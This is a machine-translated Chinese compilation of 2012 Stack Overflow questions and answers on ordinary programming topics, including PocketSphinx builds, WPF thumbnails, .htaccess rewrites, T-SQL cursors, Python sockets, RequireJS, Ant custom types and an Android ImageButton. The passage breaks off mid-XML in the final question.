> 标签：android, ubuntu, cmusphinx

我关注这个网站：[http](http://cmusphinx.sourceforge.net/2011/05/building-pocketsphinx-on-android/) ://cmusphinx.sourceforge.net/2011/05/building-pocketsphinx-on-android/ 。起初它工作正常。但是当我在文件 /jni/ 上 cmd ndk-build 时。错误显示如下：

```
Compile thumb  : sphinxutil <= sbthread.c
Compile thumb  : sphinxutil <= utf8.c
StaticLibrary  : libsphinxutil.a
SharedLibrary  : libpocketsphinx_jni.so

/home/tian/develop/android-ndk-r8c/toolchains/arm-linux-androideabi-4.6/
prebuilt/linux-x86/bin/../lib/gcc/arm-linux-androideabi/4.6/../../../../arm-linux-androideabi/bin/ld: /home/tian/桌面/PocketSphinxAndroidDemo/obj/local/armeabi/objs-debug/pocketsphinx_jni/pocketsphinx_wrap.o: in function nbest_s_hyp:/home/tian/桌面/PocketSphinxAndroidDemo/jni/pocketsphinx_wrap.c:793: error: undefined reference to 'new_Hypothesis'

/home/tian/develop/android-ndk-r8c/toolchains/arm-linux-androideabi-4.6/prebuilt/linux-x86/bin/../lib/gcc/arm-linux-androideabi/4.6/../../../../arm-linux-androideabi/bin/ld: /home/tian/桌面/PocketSphinxAndroidDemo/obj/local/armeabi/objs-debug/pocketsphinx_jni/pocketsphinx_wrap.o: in function ps_decoder_s_getHyp:/home/tian/桌面/PocketSphinxAndroidDemo/jni/pocketsphinx_wrap.c:847: error: undefined reference to 'new_Hypothesis'
collect2: ld returned 1 exit status
make: *** [/home/tian/桌面/PocketSphinxAndroidDemo/obj/local/armeabi/libpocketsphinx_jni.so] Error 1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:06:16.410

您是否粘贴了 pocketsphinx 父目录的绝对路径？像 /home/.../.../.../pocketsphinx 而不是 ~/../.../.../pocketsphinx

# c# - 生成缩略图的最有效方法是什么？

> ID：13514794
> 
> 赞同：3
> 
> 时间：2012-11-22T14:28:57.117
> 
> 标签：c#, .net, wpf, thumbnails

我正在开发一个图形应用程序，我需要为每个页面保留一个缩略图。挑战是如何在不损失性能的情况下生成缩略图文件？

目前这是我的代码：

```
VisualBrush VisualBrush = new VisualBrush(pageToGenerateThumbnailFor);
UIVisual.Background = VisualBrush;

RenderTargetBitmap = new RenderTargetBitmap((int)UIVisual.ActualWidth, (int)UIVisual.ActualHeight, 96, 96, PixelFormats.Pbgra32);

rtb.Render(UIVisual);

using (FileStream outStream = new FileStream(ThumbFileFullPath, FileMode.OpenOrCreate, 
System.IO.FileAccess.ReadWrite))
{
   PngBitmapEncoder pngEncoder = new PngBitmapEncoder();
   pngEncoder.Frames.Add(BitmapFrame.Create(rtb));
   pngEncoder.Save(outStream);
} 
```

那么，有没有更快的方法来为给定的 Visual 生成缩略图？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T15:28:52.963

我最近做了一些研究，以便为电子商务网站即时生成图像缩略图。我开始自己生成位图，然后调整大小等，类似于上面的答案。在光盘上的图像大小和质量出现问题后，我查看了[http://imageresizing.net/](http://imageresizing.net/)，此后我再也没有回头。它可以通过一行代码非常快速地从 byte()、流和物理文件生成图像：

```
ImageBuilder.Current.Build(New MemoryStream(bImage), sImageLocation + sFullFileName, New      ResizeSettings("maxwidth=214&maxheight=238")) 
```

我肯定会推荐这个组件，而不是试图重新发明轮子......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:41:30.773

我编写的实用程序库中的以下类对我来说效果很好，并产生了清晰质量的缩略图......

```
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace Simple {
    public static class ThumbnailCreator {
        private static readonly object _lock = new object();

        public static Bitmap createThumbnail(Stream source, Int32 width, Int32 height) {
            Monitor.Enter(_lock);
            Bitmap output = null;
            try {
                using (Bitmap workingBitmap = new Bitmap(source)) {
                    // Determine scale based on requested height/width (this preserves aspect ratio)
                    Decimal scale;
                    if (((Decimal)workingBitmap.Width / (Decimal)width) > ((Decimal)workingBitmap.Height / (Decimal)height)) {
                        scale = (Decimal)workingBitmap.Width / (Decimal)width;
                    }
                    else {
                        scale = (Decimal)workingBitmap.Height / (Decimal)height;
                    }
                    // Calculate new height/width
                    Int32 newHeight = (Int32)((Decimal)workingBitmap.Height / scale);
                    Int32 newWidth = (Int32)((Decimal)workingBitmap.Width / scale);
                    // Create blank BitMap of appropriate size
                    output = new Bitmap(newWidth, newHeight, PixelFormat.Format32bppArgb);
                    // Create Graphics surface
                    using (Graphics g = Graphics.FromImage(output)) {
                        g.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                        g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                        Rectangle destRectangle = new Rectangle(0, 0, newWidth, newHeight);
                        // Use Graphics surface to draw resized BitMap to blank BitMap
                        g.DrawImage(workingBitmap, destRectangle, 0, 0, workingBitmap.Width, workingBitmap.Height, GraphicsUnit.Pixel);
                    }
                }
            }
            catch {
                output = null;
            }
            finally {
                Monitor.Exit(_lock);
            }
            return output;
        }
    }
} 
```

它还保留了原始图像的纵横比。

# asp-classic - 获取 XML 节点的不同属性

> ID：13514795
> 
> 赞同：0
> 
> 时间：2012-11-22T14:29:00.390
> 
> 标签：asp-classic, vbscript

我一直在尝试从 XML 中获取不同的属性值：dim i,xmlOx,arr(100) "xmlOx" has following xml structure

```
 <root>
    <a x="Animal" y="Bird"/>
    <a x="Animal" y="Bird"/>
    <a x="Country" y="Bird"/>
    <a x="Animal" y="Bird"/>
    </root> 
```

ASP：

```
for i=0  xmlOx.selectNodes("a").length-1
 arr(i)=xmlOx(i).selectNodes("a").getAttribute("x")
next 
```

就像，这里`ve to get "x" attribute values but I don`需要重复。然后我需要将值添加到 vbscript 中的数组中。

请有人告诉我我们是怎么做的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:45:06.760

理论就[在这里](https://stackoverflow.com/a/13512982/603855)。

代码：

```
 Dim sXml : sXml = Join(Array( _
      "<root>" _
    , "<a x=""Animal"" y=""Bird""/>" _
    , "<a x=""Animal"" y=""Bird""/>" _
    , "<a x=""Country"" y=""Bird""/>" _
    , "<a x=""Animal"" y=""Bird""/>" _
    , "</root>" _
  ))
  Dim oXDoc : Set oXDoc = CreateObject("Msxml2.DOMDocument")
  oXDoc.loadXml sXml
  WScript.Echo oXDoc.xml

  Dim xObjXml  : Set xObjXml  = oXDoc.documentElement.childNodes
  Dim dicAttrs : Set dicAttrs = CreateObject("Scripting.Dictionary")
  Dim i
  For i = 0 To xObjXml.length - 1
      Dim a : a = xObjXml(i).getAttribute("x")
      dicAttrs(a) = dicAttrs(a) + 1
  Next
  Dim aAttrs : aAttrs = dicAttrs.Keys()
  WScript.Echo Join(aAttrs) 
```

输出：

```
<root>
        <a x="Animal" y="Bird"/>
        <a x="Animal" y="Bird"/>
        <a x="Country" y="Bird"/>
        <a x="Animal" y="Bird"/>
</root>

Animal Country 
```

# javascript - 使用我的 javascript 登录网站

> ID：13514797
> 
> 赞同：0
> 
> 时间：2012-11-22T14:29:03.193
> 
> 标签：javascript, html, windows-store-apps

我正在尝试使用以下 javascript 登录该站点。但是，我只加载完整的页面。我正在开发 Windows 8 应用程序

```
(function () {
"use strict";

WinJS.UI.Pages.define("/pages/home/home.html", {
    // This function is called whenever a user navigates to this page. It
    // populates the page elements with the app's data.
    ready: function (element, options) {
        // TODO: Initialize the page here.
        document.getElementById("bt_login").addEventListener("click", login, false);
    }
   });
  })();

function login() {
var xhrDiv = document.getElementById("xhrReport");
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = dataLoaded;

xhr.open("POST", "http://www.160by2.com", true, <username>, <password>);
xhr.send();

function dataLoaded() {
    if (xhr.readyState === 4) {
        if (xhr.status === 200) {
            // OK
            xhrDiv.innerHTML = window.toStaticHTML("response:" + xhr.responseText);

        } else {
            // not OK
            xhrDiv.innerText = "failure";
        }
    }
};} 
```

我想以`xhrdiv.innerHTML`“登录成功”或“登录错误”的形式显示

编辑：

我尝试了以下代码：

`iframe = document.getElementById("ifra_op"); iframe.setAttribute("src", "http://www.160by2.com/index"); document.getElementById("op").appendChild(iframe); iframe.contentWindow.document.getElementById("MobileNoLogin") = "<mobno>"; iframe.contentWindow.document.getElementById("LoginPassword") = "<pass>; iframe.contentWindow.document.getElementsByName("LoginForm").click();`

但是，有一个错误。它说“Javascript 运行时错误：数学未定义”

“数学”来自网站。我不知道如何处理这个。此外，该权限被拒绝。为什么呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:33:13.837

您需要确保远程服务器中有服务（类似于 Web 服务）来处理请求。

在这里你可以做的是。

1.  创建一个iframe并将src设置为160by2；
2.  使用 iframe.contentwindow 访问网页，注入您的代码以填写表单并触发提交按钮。
3.  解析收到的 html 以验证您的登录。

**使用 jquery ，让生活更轻松。**

```
var iframe = $("#ifra_op");
$(iframe).attr("src", "http://www.160by2.com/index");
$(iframe).attr("onload","submitForm();");
function submitForm(){
$(iframe.contentWindow.document).find("#MobileNoLogin").val("9999"); 
$(iframe.contentWindow.document).find("#LoginPassword").val("pass"); 
$('#button').click();
} 
```

# .htaccess - CodeIgniter 和 htaccess RewriteRule

> ID：13514798
> 
> 赞同：0
> 
> 时间：2012-11-22T14:29:09.917
> 
> 标签：.htaccess, mod-rewrite, codeigniter-2

我有一个名为（例如）**TheLink**的控制器，我通常可以通过**mywebsite/index.php/TheLink**访问它。是否可以在 htaccess 中创建 RewriteRule 以通过**mywebsite/index.php/The-Link**访问它而不重定向到 TheLink？所以基本上我想要它的 URL 说**mywebsite/index.php/The-Link**（带破折号）但使用 TheLink 控制器。我试过了

> RewriteRule ^The-Link$ index.php/TheLink [L]

但这只是将我重定向到默认的 CodeIgniter 404 页面

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:32:06.550

```
# To remove index.php from URL

RewriteEngine On
RewriteCond %{REQUEST_URI} ^system.*
RewriteRule ^(.*)$ /index.php/$1 [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php/$1 [L] 
```

此外，如果网站托管在另一个目录中，而不仅仅是根目录，请添加：

```
RewriteBase /some_directory/ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T15:40:36.717

好吧，显然这个问题与 htaccess 无关，而是以完全不同的方式解决。在这里找到的解决方案：

[Codeigniter Routes 正则表达式 - 在控制器/方法名称中使用破折号](https://stackoverflow.com/questions/2428134/codeigniter-routes-regex-using-dashes-in-controller-method-names/2432405#2432405)

编辑：此外，还有许多不同的解决方案，包括上述解决方案，可在此处找到： http: [//ellislab.com/codeigniter/forums/viewthread/124396/](http://ellislab.com/codeigniter/forums/viewthread/124396/)

# sql-server-2008 - 光标在函数或视图中循环

> ID：13514801
> 
> 赞同：0
> 
> 时间：2012-11-22T14:29:31.383
> 
> 标签：sql-server-2008, tsql, cursor

我有一个游标在整个表值函数中循环，如下面的代码所示：

```
 DECLARE db_cursor CURSOR FOR 
            SELECT *        
            from    [dbo].[GetStock]()
                    ... 
```

我的问题是：光标是否在每次迭代时执行该函数？视图的相同问题。
问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-22T06:01:34.793

这取决于游标的类型：

*   如果是静态游标，则只执行一次SELECT，将结果放到临时表中，从临时表中一一获取结果
*   如果是动态游标，则从查询中一一获取结果
*   如果它是键集驱动的游标，那么它将在游标打开时获取每个符合条件的行的键，并从原始查询中一一获取其余列
*   如果它是快进游标，则当结果具有唯一键时，它的行为类似于动态游标；当没有唯一键时，它的行为类似于静态游标。

查询有几个限制会影响游标的类型，如下所列：[使用隐式游标转换](http://msdn.microsoft.com/en-us/library/ms190641.aspx)。

您可以使用 sp_describe_cursor 过程找出游标类型。有关代码示例，请参阅[sp_describe_cursor](http://msdn.microsoft.com/en-us/library/ms173806.aspx)主题。

对于多语句 UDF-s，您最有可能获得键集驱动游标（如果结果表具有唯一键）或静态游标（如果结果表没有唯一键）。对于内联 UDF-s，它取决于查询和基础表。

我猜您有一个多语句 UDF，在这种情况下，您应该通过在声明游标时指定 STATIC 来避免键集驱动的游标。

# python - 管道破裂的原因

> ID：13514805
> 
> 赞同：1
> 
> 时间：2012-11-22T14:29:40.307
> 
> 标签：python, networking, pipe

我正在编写一个需要完全连接网络的点对点程序。但是，当我在本地对此进行测试并调出大约 20 个节点时，一些节点成功创建了到其他节点的套接字，但是在发生断管错误后立即写入时。这只发生在我一个接一个地启动所有节点时；如果我睡一秒钟，我看不到这个问题。

我有处理两个节点的逻辑，这两个节点都打开了彼此的套接字，这可能是错误的，尽管我确实看到它在较少节点的情况下正常运行。这是本地测试的限制吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T20:05:18.897

'Broken pipe' 表示您已写入已被另一端关闭的连接。所以，你一定是以某种方式做到了这一点。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-12-27T10:28:18.320

当您尝试写入另一端已关闭的管道时，会发生“Broken Pipe”错误。如果您正在创建自己的套接字，则可以处理这样的脚本：

```
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('', 2020))

try:
    s.recv(1024)
except socket.error as e:
    print e
    print

s.send('hello') 
```

对于这种错误，这段代码对我来说很好。如果连接被客户端重置/终止，则可能会忽略 Broken Pipe。

```
[Errno 104] Connection reset by peer

Traceback (most recent call last):
  File "./client1.py", line 17, in
    s.send('hello')
socket.error: [Errno 32] Broken pipe 
```

# .htaccess - HTACCESS RewriteRule 更改 URL OK 但给出 404 页面

> ID：13514817
> 
> 赞同：3
> 
> 时间：2012-11-22T14:30:31.297
> 
> 标签：.htaccess, mod-rewrite, joomla2.5

我正在使用 Joomla 构建一个新站点，并且在全局配置中选择了“搜索引擎友好 URL”和“使用 URL 重写”，这提供了良好的 SEF URL，但不是很完美！

如果指向页面的链接没有与之关联的菜单项，则 URL 将如下所示：

> example.com/10-category/5-article

我想使用**htaccess**删除数字和连字符，所以它看起来像：

example.com/category/article

我在我的 htaccess 文件中创建了重写规则，如下所示：

```
RewriteRule ^([0-9]+)-(.*)/([0-9]+)-(.*)$ /$1$2/$3$4 [R=301,L]
RewriteRule ^([0-9]+)(.*)/([0-9]+)(.*)$ /$2/$4 [R=301,L] 
```

浏览器地址栏现在显示我想要的 URL，example.com/category/article，但页面显示 404 错误！

它与 Joomla SEF 有关吗？

我究竟做错了什么？

****更新**** 删除连字符的第一个 RewriteRule 只能自行正常工作，当两个 RewriteRule 都处于活动状态时，我只会收到 404 错误页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:33:55.633

这是一个盲目的猜测，Joomla 可能需要这些数字来知道要提供哪些内容。它不能仅仅通过类别或文章的名称来判断（事实上在大多数情况下，您甚至可以将其省略），但重要的是数字。

因此，当您在没有数字的情况下重写 URL 时，您正在请求 Joomla 不知道如何处理的页面，它会给您一个 404。唯一的解决方案是编写一个插件或映射名称的东西将类别和文章添加到相应的 ID，但这并不容易。

关于 SEO，我不认为 url 中的数字有那么大的负面影响。如果您网站的其余部分 SEO 都很好，那么这无关紧要。

# jquery - 将 iscrollview.js 包含在 RequireJS 和 jQuery Mobile 中

> ID：13514818
> 
> 赞同：0
> 
> 时间：2012-11-22T14:30:35.320
> 
> 标签：jquery, jquery-mobile, requirejs, iscroll

我慢慢地对这个绝望了。我有一个项目，我使用 RequireJS 来分隔我的 JS 代码。我已经设法启动并运行它，但现在我在使用[iscrollview](https://github.com/watusi/jquery-mobile-iscrollview)库时遇到了困难。这提供了在 jQuery Mobile 网站中使用的[iScroll实现。](http://cubiq.org/iscroll-4)这是一些代码来勾画我的情况：

索引.html：

```
<!DOCTYPE html>
<html>
    <head>
        <title>iscrollview</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" type="text/css" href="js/lib/jquery-mobile/jquery.mobile-1.2.0.min.css" />
        <link rel="stylesheet" type="text/css" href="js/lib/iscrollview/iscrollview.css" />
        <script type="text/javascript" data-main="js/main.js" src="js/lib/require/require-2.1.1.min.js"></script>
    </head>

    <body>
        <div data-role="page">

            <div data-role="header">
                <h1>Header</h1>
            </div>

            <div data-role="content">
                <div data-iscroll>
                    <!-- this contains some long content (long enough to trigger scrolling) -->
                </div>
            </div>

            <div data-role="footer">
                <h2>Footer</h2>
            </div>

        </div>
    </body>
</html> 
```

js/main.js：

```
requirejs.config({
    baseUrl: 'js',
    paths: {
        jquery: 'lib/jquery/jquery-1.8.2.min',
        jquerymobile: 'lib/jquery-mobile/jquery.mobile-1.2.0.min',
        iscroll: 'lib/iscroll/iscroll',
        iscrollview: 'lib/iscrollview/iscrollview'
    },
    shim: {
        jquerymobile: {
            deps: ['jquery']
        },
        iscroll: {
            deps: ['jquerymobile']
        },
        iscrollview: {
            deps: ['iscroll']
        }
    }
});

requirejs(['jquery','jquerymobile','iscroll','iscrollview'], function($){

    /* I would expect that the correct JS files are loaded by the time we get here,
       so the iscrollview.js should recognize the data-trim attribute which I've applied
       earlier in index.html but unfortunately this doesn't happen in this implementation. /*

}); 
```

我希望我已经很好地指出了我的问题，以便你们出去。非常感谢您为此付出的努力！

**编辑：**

[您可以在此处](https://rapidshare.com/files/470972654/iscrollview.zip)找到（简化的）项目。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T08:41:57.963

查看您的 .zip 项目后，我终于找到了答案。iscrollview.js 是自初始化的，您可以在 iscrollview.js 文件的第 1839 行看到。自初始化取决于“pagecreate”事件，当 require.js 加载到文件中时，该事件显然已经触发。 **所以解决方法是我们自己初始化iscrollview**

```
requirejs.config({
    baseUrl: 'js',
    paths: {
        jquery: 'lib/jquery/jquery-1.8.2.min',
        jquerymobile: 'lib/jquery-mobile/jquery.mobile-1.2.0.min',
        iscroll: 'lib/iscroll/iscroll',
        iscrollview: 'lib/iscrollview/iscrollview'
    },
    shim: {
        jquerymobile: {
            deps: ['jquery']
        },
        iscroll: {
            deps: ['jquerymobile']
        },
        iscrollview: {
            deps: ['iscroll']
        }
    }
});

requirejs(['jquery','iscroll','jquerymobile','iscrollview'], function($, iScroll){
    var elements = jQuery(document).find(":jqmData(iscroll)");
    elements.iscrollview();
}); 
```

# database - 用于存储基于位置的部分文本检索的大型文档的数据库

> ID：13514819
> 
> 赞同：1
> 
> 时间：2012-11-22T14:30:35.900
> 
> 标签：database, database-design, nosql, document

我正在寻找一个可以存储大型文档（10-20MB）并执行以下操作的数据库系统：

*   能够按位置访问给定文档中的内容。例如，获取位置 100 到 500 之间的文本。
*   数据库应该只返回来自文档的部分内容（可能不加载整个文档）。所以我在寻找效率。
*   应该在指定位置（或范围）处理插入、更新和删除文本块。
*   我想使用这些位置来定义边界。例如，位置 100 到 500 是页码。4

这将与 Web 应用程序一起使用，用户将在其中以连续文档的形式创建内容（例如，一个文档是具有 100 页的简化 Google 文档）。我曾考虑过 MongoDB，但我对它的了解还不够。

-

我可以在这里使用什么样的数据库？（我正在寻找一个开源数据库）

或者

如果我必须自己编写这样的系统，我的方法应该是什么，我可以从哪里开始？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-25T01:19:56.130

我一直觉得把文件放在数据库里很不舒服；文件系统是文件的理想数据库（您的大小不受操作系统可以处理的限制），索引/搜索可以由单独的应用程序处理，并且您的数据库可以简化为包含 uri-esque 的简单表链接回系统中的每个实际文件和任何其他适当的元数据。

在您的情况下，像[lucene](https://lucene.apache.org/)这样的文件索引器/搜索引擎可能比尝试使用传统的 DMBS 作为文件系统更适合您的项目。

由于您计划将内容放入数据库，因此我假设您将控制如何将文档添加到系统中。这使您可以更轻松、更高度地将表示层与文件系统数据存储集成，而不必担心文件被随意丢弃、更改或删除到您的特殊存储库中。

所以一个非常基本的高级系统概述可能看起来像这样：

```
[(APP) Your System]---------[(DB) Catalog ]
           |       \              |
           |        --------      |
           |                \     |
[(FileSystem) Files]--------[(App) Indexer] 
```

随着您的系统执行文档维护和前端搜索以及索引器监控文件系统和更新目录数据库的所有智能。（如果您的索引器最终提供了足够的功能或添加元数据的能力，则目录可能是不必要的 - 但如果您确实需要基于“100 到 300 之间的文档”进行搜索，它可能更容易与索引器结合使用）

# c# - SendMessage，何时使用 KEYDOWN、SYSKEYDOWN 等？

> ID：13514820
> 
> 赞同：4
> 
> 时间：2012-11-22T14:30:36.350
> 
> 标签：c#, sendmessage

我正在编写一个应用程序，它使用`SendMessage`.

```
[DllImport("user32.dll")]
public static extern int SendMessage(IntPtr hWnd, int Msg, uint wParam, uint lParam); 
```

我一直在尝试各种参数，我注意到，根据我发送的击键，我必须将不同的参数传递给 parameter `int Msg`。

例如，我将以下定义为`Msg`.

```
private static ushort WM_SYSKEYDOWN = 0x0104;
private static ushort WM_CHAR = 0x0102;
private static ushort WM_KEYDOWN = 0x0100; 
```

以及以下传递给第三个参数的测试键`wParam`：

```
private static ushort VK_F1 = 0x70;
private static ushort VK_A = 0x41;
private static ushort VK_TAB = 0x09; 
```

当我想发送`F1`密钥 ( `VK_F1`) 时，它只在使用时有效`WM_SYSKEYDOWN`，当我想发送`A`密钥时，它只在我使用时有效`WM_CHAR`，当我想发送`TAB`密钥时，它只在我使用时有效`WM_KEYDOWN`。

我的问题是：是否有一些文档可以根据发送的密钥告诉我何时使用`WM_KEYDOWN`,`WM_SYSKEYDOWN`等？或者也许我做错了，并且有一种适用于任何键的一致方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:43:57.493

[Microsoft 在此键盘输入 (Windows)](http://msdn.microsoft.com/en-us/library/windows/desktop/gg153546%28v=vs.85%29.aspx)中解释了这些 WM 消息之间的区别。

`WM_SYSKEYDOWN`模拟用于切换窗口的`ALT`+等系统命令。`TAB`

`WM_CHAR`例如，模拟用户输入，例如在文本框中输入。

`WM_KEYDOWN`通常与 . 一起使用`WM_KEYUP`。请参阅[WM_KEYDOWN 消息 (Windows)](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646280%28v=vs.85%29.aspx)。

您很可能会想要使用`WM_CHAR`.

# java - 具有空类引用结果的自定义 Ant 类型

> ID：13514821
> 
> 赞同：0
> 
> 时间：2012-11-22T14:30:36.593
> 
> 标签：java, ant, customization

我使用 Apache Ant 作为工具来完成我必须一遍又一遍地完成的繁琐数据收集和计算任务。我已经定义了一些自定义 Ant 任务，它们工作得非常好。

但是，现在我想使用`<typedef>`标签创建新的数据类型。我想在我的开头定义一些数据，`build.xml`以后可以参考，就像我的一个 Java 项目的常规构建文件中的以下示例：

```
<path id="classpath.build">
    <fileset dir="${dir.lib}">
        <include name="**/*.jar" />
        <exclude name="**/junit*" />
    </fileset>
</path> 
```

所以我创建了一个简单的 HelloWorld 示例，如下所示：

```
<sampledata data="LOL" id="someid" /> 
```

在自定义 ant 任务中，我想引用此数据类型：

```
<customtask dataref="someid" /> 
```

这似乎很简单，所以在挖掘 API 文档后，我发现我的类必须扩展`org.apache.tools.ant.types.DataType`并且必须有方法`setRefid(org.apache.tools.ant.types.Reference r)`。

我的自定义 Ant 任务 customtask 对 dataref 属性使用以下代码：

```
public class CustomTask extends Task {

     private SampleData data;

     public void setDataref(Reference r) {
        data = new SampleData(getProject());
        data.setRefid(r);
     }

     public void execute() {
          System.out.println(data.getData());
     }
} 
```

我的 SampleData 实现如下：

```
public class SampleData extends DataType {

     private String data;

     public SampleData(Project project) {
         setProject(project);
     }

     public void setData(String data) {
         this.data = data;
     }

     public String getData() {
         return this.data;
     }

     public void setRefid(Reference r) {
          super.setRefid(r);
     }

 } 
```

请注意，这一切都基于`org.apache.tools.ant.types.Path`显示我想要的行为的来源。

但是，在使用上述自定义任务创建目标后，输出为`null`. 因此 SampleData 已实例化，但引用设置不正确。当我调试时，我发现 SampleData 在我的 ant 文件中正确实例化了数据`LOL`，甚至参考设置为`someid`. 此外，`CustomTask`类`setDataref`方法确实传递了一个名为的引用`someid`，因此`setDataref`方法中的一切都出错了，但我不知道我必须做什么，并且缺少手册（或者我错过了一个重要部分）。

我觉得我没有完全掌握带有 id 的自定义数据类型的生命周期。

**编辑 23-11-2012 9:24：**

经过更多的摆弄和查看源代码后，`org.apache.tools.ant.types.Path`我遵循了那里的一些方法，并将我的 SampleData.getData 更改为以下内容：

```
public String getData() {
    if(isReference()) {
        return ((SampleData)getCheckedRef()).getData();
    }
    return this.data;
} 
```

我更进一步，但是现在我在我的中收到以下 Ant 错误`build.xml`：

```
 /home/arjan/dev/so-demo/build.xml:9: someid doesn't denote a SampleData 
```

但是，当我检查引用对象封装的类时，它是正确的类型。我现在对此感到非常厌倦。还有什么提示吗？

**编辑 23-11-2012 11:46：**

我创建了一个带有清晰测试用例的 Gist。我的 Ant 版本是 1.8.4。希望有人会提出解决方案，因为我查看了其他库，如 Sonatype Aether Antlib 并遵循他们的推理方式。

方法都出错了`getCheckedRef`，特别是在 Ant 源文件中`src\main\org\apache\tools\ant\types\DataType.java:250`：

```
if (!(requiredClass.isAssignableFrom(o.getClass()))) {
    log("Class " + o.getClass() + " is not a subclass of " + requiredClass,
            Project.MSG_VERBOSE);
    String msg = ref.getRefId() + " doesn\'t denote a " + dataTypeName;
    throw new BuildException(msg);
} 
```

到底是怎么回事？这是我能想出的简单测试用例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-12T15:56:21.013

我相信这可能会解决您的问题，我遇到了类似的错误：

您缺少自定义任务和类型的 loaderRef 指令。请参见[此处](http://ant.apache.org/manual/Tasks/typedef.html)：如果您正在定义与多个 taskdef 或 typedef 任务共享相同类路径的任务或类型，则相应的类将由不同的 Java 类加载器加载。从 Java VM 的角度来看，通过不同的 ClassLoader 加载的两个同名类不是同一个类，它们不共享静态变量，这些类的实例不能访问私有方法或实例的属性。另一个类”的同名。它们甚至不属于同一个 Java 包，也不能访问包私有代码。

因此，当您通过 typedef 和 taskdef 定义自定义任务和自定义类型时，请使用 loaderRef 属性 - 这可以是任何东西（如 customTaskLoader），只要它在您的任务和类型定义之间是相同的。

从那里你可以进一步简化你的代码：

```
public class CustomTask extends Task {

 private SampleData data;

 public void execute() {
      System.out.println(data.getData());
 } 
```

}

和

```
public class SampleData extends DataType {

 private String data;

 public SampleData(Project project) {
     setProject(project);
 }

 public void setData(String data) {
     this.data = data;
 }

 public String getData() {
     if(isReference()) {
         return ((SampleData)getCheckedRef()).getData();
     }
     return this.data;
 } 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T11:15:34.757

我使用上面的 Gist 解决了它！问题是双重的，但是我不知道如何解决第二个问题。

**问题 1**

不知何故，和标签的`classpathref`论点不是要走的路。我将它们引导到目录中我编译的类。`typedef``taskdef``cls`

所以我决定将我所有的文件打包并放在`{ant.home}/lib`如下目录中：

```
<jar basedir="cls" destfile="${ant.home}/lib/demo.jar" />
<delete dir="cls" /> 
```

这样我可以删除`classpathref`论点。我认为这可能会解决它......但我错了，但它是有效的实际*解决方案*（如果你可以这样称呼它）。

**问题 2**

Eclipse...这个程序使用它自己的Ant 发行版，不知何故我自己生成的jar 在运行Eclipse 时没有添加到类路径中。这会导致以下错误：

```
typedef class types.DemoType cannot be found 
```

从命令行运行被证明是没有问题的。

**底线**

通过 rarring 我的类型和任务并从命令行运行它来解决问题。使用`classpathref`with`typedef`或`taskdef`导致`someid doesn't denote a SampleData`错误。使用 Eclipse 会导致`class not found`错误。

我必须说奇怪的行为，我想知道如何使 Eclipse 正确地处理自定义任务，因为这必须是可能的。

嗯……这花了我几个小时。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T05:50:28.893

我认为问题是你没有在你的班级中为 Data 提供 setter ......这对于 CustomTask 是强制性的......

```
public class CustomTask extends Task {
    private SampleData data;
     public void setDataref(Reference r) {
        data = new SampleData(getProject());
        data.setRefid(r);
     }
    public void setData(SampleData data){
        this.data = data;
    }
     public void execute() {
          System.out.println(data.getData());
     }
} 
```

希望这可以帮助..

# android - ImageButton 背景更改与自定义可绘制状态

> ID：13514823
> 
> 赞同：0
> 
> 时间：2012-11-22T14:30:40.273
> 
> 标签：android, state, imagebutton

我有一个自定义`ImageButton`类，`ToggleButton's`根据本教程[How to add a custom button state](https://stackoverflow.com/questions/4336060/android-how-to-add-a-custom-button-state)模仿选中状态。

当我有一个可绘制的状态列表作为`android:src`属性时，一切正常，但自定义状态不适用于该`ImageButton's` `android:background`属性。

这是我的代码：

```
import android.content.Context;
import android.util.AttributeSet;
import android.widget.Checkable;
import android.widget.ImageButton;

public class CheckableImageButton extends ImageButton implements Checkable {

    private static final int[] STATE_CHECKED = {R.attr.state_checked};

    private boolean mChecked = false;

    public CheckableImageButton(Context context) {
        super(context);
    }

    public CheckableImageButton(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    @Override
    public int[] onCreateDrawableState(int extraSpace) {
        final int[] drawableState = super.onCreateDrawableState(extraSpace + 1);

        if(mChecked){
            mergeDrawableStates(drawableState, STATE_CHECKED);
        }

        return drawableState;
    }

    @Override
    public boolean isChecked() {
        return mChecked;
    }

    @Override
    public void setChecked(boolean checked) {
        mChecked = checked;
        refreshDrawableState();
    }

    @Override
    public void toggle() {
        setChecked(!mChecked);
    }
} 
```

以及布局 XML 中的相关片段：

```
<com.my.package.view.CheckableImageButton
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_gravity="center_vertical"
    android:background="@drawable/header_button_bg"
    android:padding="5dp"
    android:src="@drawable/menu_button"
    tools:ignore="ContentDescription" /> 
```

状态列表可绘制：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res/my.package" >

